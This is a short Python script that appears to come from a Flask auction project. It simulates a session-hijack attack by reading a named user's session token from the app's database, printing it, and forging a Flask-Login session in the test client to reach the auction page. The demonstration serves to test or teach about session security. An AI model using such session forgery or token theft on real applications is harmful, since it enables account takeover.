# simulate_attack_session_hijack.py
from app import app
from models import db, Session, User
from flask_login import login_user
from flask import Flask
from bidding import list_auctions

def simulate_session_hijack_attack():
    with app.app_context():
        print("An attacker is being simulated to obtain a user's session token...\n")

        # obtain the session token of victim user
        print("Searching for the session token of the victim user...\n")
        victim_user = User.query.filter_by(username='luckyli1107').first()
        session = Session.query.filter_by(user_id=victim_user.id).first()

        if session:
            print(f"[+] session token stolen successfully: {session.token}")
            print(f"[+] user ID: {victim_user.id}, username{victim_user.username}\n")
        else:
            print("[-] Session data not found")

        print("[!] Trying to simulate this user's access to a restricted page (e.g. viewing an auction listing)...")

        # Simulating Access with the Flask Test Client
        client = app.test_client()

        with client:
            # Simulated login status (insecure practice, just demonstrating the attack)
            with client.session_transaction() as flask_session:
                flask_session['_user_id'] = str(victim_user.id)  # The default storage field for the flask-login 

            # Simulate access to protected pages
            response = client.get('/auctions/')
            if response.status_code == 200:
                print("[+] Successfully simulates a logged in user visiting the auction page!")
            else:
                print("[-] Simulated access failed, status code:", response.status_code)

if __name__ == '__main__':
    simulate_session_hijack_attack()
